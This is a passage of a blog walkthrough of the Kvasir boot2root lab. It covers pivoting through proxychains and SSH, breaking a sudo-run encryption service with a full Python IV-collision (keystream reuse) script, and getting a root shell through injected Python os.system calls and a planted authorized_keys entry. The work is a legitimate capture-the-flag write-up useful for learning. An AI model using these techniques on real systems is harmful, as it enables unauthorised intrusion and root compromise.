+<p><em>OrcWQi5VhfCo</em>. Was this the password for the <code>.rar</code> archive?</p>
+
+<pre><code class="language-bash">root@kali:~# unrar x /mnt/Secret.rar
+
+UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
+
+
+Extracting from /mnt/Secret.rar
+
+Enter password (will not be echoed) for MyPassword.txt: 
+
+Extracting  MyPassword.txt                                            OK 
+All OK
+root@kali:~# cat MyPassword.txt 
+5224XbG5ki2C
+</code></pre>
+
+<p>Yep! However, another random string. Remembering the note about this being a disk image from <code>kefka</code>, I attempted to SSH into <strong>192.168.4.100</strong> as <code>kefka</code> with this password:</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains ssh -D 8002 kefka@192.168.4.100
+ProxyChains-3.1 (http://proxychains.sf.net)
+kefka@192.168.4.100's password: # entered 5224XbG5ki2C
+Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
+kefka@adm:~$
+</code></pre>
+
+<p>A final <code>tcp/8002</code> proxy was opened on my attacking machine.</p>
+
+<p>##taking the last ride to the flag
+Enumeration as kefka revealed that this user is allowed to run <code>/opt/wep2.py</code> as root. This is almost screaming at me as the privilege escalation path!</p>
+
+<p>I ran the script with sudo, just to be presented with&hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:</p>
+
+<pre><code class="language-bash">kefka@adm:~$ sudo /opt/wep2.py
+^CTraceback (most recent call last):
+  File &quot;/opt/wep2.py&quot;, line 93, in &lt;module&gt;
+    sock, addr = s.accept()
+  File &quot;/usr/lib/python2.7/socket.py&quot;, line 202, in accept
+    sock, addr = self._sock.accept()
+KeyboardInterrupt
+kefka@adm:~$
+</code></pre>
+
+<p>I re-run the script backgrounding it with <code>&amp;</code>, and inspect the output of <code>netstat -pant</code> to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new <code>tcp/8002</code> proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:</p>
+
+<pre><code class="language-bash"># /etc/proxychains.conf has line
+# socks5    127.0.0.1 8002
+
+# connections will appear to be coming from localhost
+root@kali:~# proxychains nc -v 127.0.0.1 1234
+ProxyChains-3.1 (http://proxychains.sf.net)
+127.0.0.1: inverse host lookup failed: 
+(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
+=============================
+Can you retrieve my secret..?
+=============================
+
+Usage:
+'V' to view the encrypted flag
+'E' to encrypt a plaintext string (e.g. 'E AAAA')
+
+V
+5a5062:36507a63b56865f7fd201860
+^C
+root@kali:~#
+</code></pre>
+
+<p>We are presented with yet another <em>game</em>, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the <code>netcat</code> connection killed, causing me to have to re-run <code>sudo /opt/wep2.py</code> on the kefka session.</p>
+
+<p>By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were <code>salt:cyphertext</code>, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with <em>A</em>, and studied the output:</p>
+
+<pre><code class="language-bash">E A
+348bbc:8d
+E A
+f2fb0c:6e
+E A
+64d7fb:2d
+</code></pre>
+
+<p>Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.</p>
+
+<p>Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename <code>wep2.py</code> should be taken as a hint!</p>
+
+<p><em>This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)</em></p>
+
+<p>###understanding what WEP actually is
+With the limited interaction I have had with the last game, and the hint <code>wep2</code>, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.</p>
+
+<p>Some resources that really helped me get to grips with what we are facing here was:
+ <a href="http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf">http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf</a>
+ <a href="http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt">http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt</a>
+ <a href="http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt">http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt</a>
+ <a href="http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf">http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf</a></p>
+
+<p>Of the above list, I highly recommend you check out the <code>.ppt</code>&rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.</p>
+
+<p>The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let <em>C</em> be the cipher text and <em>P</em> be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:</p>
+
+<p><strong>C = P ^ RC4(iv, k)</strong></p>
+
+<p>With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about <a href="http://en.wikipedia.org/wiki/Stream_cipher_attack">Stream Cipher Attacks</a> and <a href="http://en.wikipedia.org/wiki/Related-key_attack">Related Key Attacks</a>. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.</p>
+
+<p>My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&rsquo;s, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the <code>2</code> in <code>wep2</code> was another troll :)</p>
+
+<p>###attacking the encryption game
+Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.</p>
+
+<p>I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).</p>
+
+<p>Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.</p>
+
+<p>I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&rsquo;s cipher text:</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains ./un_wep-testing.py
+ProxyChains-3.1 (http://proxychains.sf.net)
+[+] Generating base iv:cy dictionary with 'A' *24
+[+] iv_dict knows about 5000 combinations
+[+] Starting Bruteforce with 'B' *24
+[+] Frame matched IV of 929d87 in 4559 tries!
+[+] Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
+[+] Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48
+
+[+] A ^ B
+BBBBBBBBBBBBBBBBBBBBBBBB
+[+] Done
+</code></pre>
+
+<p>This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.</p>
+
+<p>With the changes in, I ended up with the following script:</p>
+
+<pre><code class="language-bash">#!/usr/bin/python
+
+# Kvasir RC4 Key Re-use Attack
+
+import socket
+
+# start a fresh iv_dict used for lookups
+iv_dict = {}
+
+# connection to the thing
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(('127.0.0.1', 1234))
+
+# read the banner so we can continue
+
+# =============================
+# Can you retrieve my secret..?
+# =============================
+# 
+# Usage:
+# 'V' to view the encrypted flag
+# 'E' to encrypt a plaintext string (e.g. 'E AAAA')
+banner = sock.recv(1024)
+
+# create some iv:cyper combinations of the flag
+print '[+] Generating base iv:cy dictionary'
+for i in range(0,5000):
+    sock.send('V\n')
+    frame = sock.recv(150)
+    iv = frame.split(':')[0]
+    cy = frame.split(':')[1]
+
+    # add the values
+    iv_dict[iv] = cy.strip()
+print '[+] The iv_dict knows about %d combinations' % len(iv_dict)
+
+# start processing the second string, looking up the IV
+print '[+] Starting Bruteforce with \'B\' *24'
+count = 0
+while True:
+
+    count += 1
+    sock.send('E ' + 'B' *24 + '\n')
+    frame = sock.recv(150)
+    iv = frame.split(':')[0]
+    cy = frame.split(':')[1].strip() # annoying \n
+
+    if iv in iv_dict:
+        print '[+] Frame matched IV of %s in %d tries!' % (iv, count)
+        print '[+] Base Cyper Text was: %s' % iv_dict[iv]
+        print '[+] Matched Cypher Text: %s' % cy
+
+        # first XOR to get the keystream for this IV
+        keystream = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(cy.decode(&quot;hex&quot;),'B'*24))
+        print '[+] Keystream: %s' % keystream.encode(&quot;hex&quot;)
+
+        # then decode second cypher text using the keystream for the cleartext
+        decrypted = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip((iv_dict[iv]).decode(&quot;hex&quot;),keystream))
+        print '[+] Decrytped flag is: %s' % decrypted
+        break
+
+    # progress incase things take longer than expected
+    if count % 100000 == 0:
+        print '[+] Tries: %d' % count
+
+print '[+] Done'
+sock.close()
+</code></pre>
+
+<p>In no time at all, the above code outputs the decrypted flag:</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains ./un_wep.py
+ProxyChains-3.1 (http://proxychains.sf.net)
+[+] Generating base iv:cy dictionary
+[+] The iv_dict knows about 5000 combinations
+[+] Starting Bruteforce with 'B' *24
+[+] Frame matched IV of 06f39e in 1696 tries!
+[+] Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
+[+] Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
+[+] Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
+[+] Decrytped flag is: 0W6U6vwG4W1V
+[+] Done
+</code></pre>
+
+<p><code>0W6U6vwG4W1V</code>. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&hellip; bed time for me!!</p>
+
+<p>##finally getting the flag, sort of&hellip;
+I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.</p>
+
+<p>After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains nc -v 127.0.0.1 1234
+ProxyChains-3.1 (http://proxychains.sf.net)
+127.0.0.1: inverse host lookup failed: 
+(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
+=============================
+Can you retrieve my secret..?
+=============================
+
+Usage:
+'V' to view the encrypted flag
+'E' to encrypt a plaintext string (e.g. 'E AAAA')
+
+0W6U6vwG4W1V
+&gt;
+</code></pre>
+
+<p>Wut. Ok, so I have a <em>thing</em> now. It didn’t accept anything I was typing into it. Everything just came back with another <code>&gt;</code>.</p>
+
+<pre><code class="language-bash">&gt; ls
+&gt; id
+&gt; whoami
+&gt; ls -lah
+&gt; uname -a
+&gt; help
+&gt; ?
+&gt; 
+</code></pre>
+
+<p>I disconnected from the netcat session and tabbed back to the session where the <code>/opt/wep2.py</code> script is started. Immediately it became clear what was going on:</p>
+
+<pre><code class="language-bash">kefka@adm:~$ sudo /opt/wep2.py
+Traceback (most recent call last):
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name 'ls' is not defined
+Traceback (most recent call last):
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name 'whoami' is not defined
+Traceback (most recent call last):
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name 'ls' is not defined
+Traceback (most recent call last):
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name 'uname' is not defined
+  File &quot;&lt;string&gt;&quot;, line 1
+    ?
+    ^
+SyntaxError: invalid syntax
+Traceback (most recent call last):
+  File &quot;/opt/wep2.py&quot;, line 94, in &lt;module&gt;
+    handler(sock, addr)
+  File &quot;/opt/wep2.py&quot;, line 74, in handler
+    sock.send(p1)
+socket.error: [Errno 32] Broken pipe
+kefka@adm:~$
+</code></pre>
+
+<p>It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:</p>
+
+<pre><code class="language-bash">0W6U6vwG4W1V
+&gt; import os; os.system('id');
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>Yay :) I went straight for the <code>cat /root/flag</code>:</p>
+
+<pre><code class="language-bash">&gt; import os; os.system('cat /root/flag');
+    _  __                             _            
+   | |/ /   __ __   __ _     ___     (_)      _ _  
+   | ' &lt;    \ I /  / _` |   (_-&lt;     | |     | '_| 
+   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
+  _|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| 
+  &quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-' 
+
+Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
+gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax 
+gur Zrnq bs Cbrgel...
+
+Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
+Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.
+
+Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
+uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.
+
+  enfgn_zbhfr(@_EnfgnZbhfr)
+&gt; 
+</code></pre>
+
+<p>Err, oh <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH&rsquo;d in as root:</p>
+
+<pre><code class="language-bash">root@kali:~# proxychains ssh root@127.0.0.1 -i kvasir_key
+ProxyChains-3.1 (http://proxychains.sf.net)
+Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Nov  9 16:57:16 2014 from localhost
+root@adm:~#
+</code></pre>
+
+<p>##the final troll
+With the <code>/root/flag</code> in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with <code>decode()</code> again:</p>
+
+<pre><code class="language-bash">root@adm:~# python
+Python 2.7.3 (default, Mar 13 2014, 11:03:55) 
+[GCC 4.7.2] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; with open('/root/flag') as f:
+...     flag = f.read()
+... 
+&gt;&gt;&gt; print flag.decode('rot13')
+    _  __                             _            
+   | |/ /   __ __   __ _     ___     (_)      _ _  
+   | ' &lt;    \ V /  / _` |   (_-&lt;     | |     | '_| 
+   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
+  _|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| 
+  &quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-' 
+
+Congratulations on beating Kvasir - I hope you enjoyed
+the ride.  Take his blood, mix with honey and drink 
+the Mead of Poetry...
+
+Big shout out to my beta testers: @barrebas and @TheColonial.
+Special thanks to Bas for his patience during this endeavour.
+
+Feel free to ping me with thoughts/comments on
+http://wi-fu.co.uk, #VulnHub IRC or Twitter.
+
+  rasta_mouse(@_RastaMouse)
+
+&gt;&gt;&gt;
+</code></pre>
+
+<p>##conclusion
+Wow. I actually can&rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!</p>
+
+<p>Many many thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for putting together this polished piece of work and <a href="https://twitter.com/VulHub">@VulnHub</a> for the hosting!</p>
+
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "slashnote";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "slashnote";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<script src="http://leonjza.github.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
+  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+  s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+
+</body>
+</html>
+
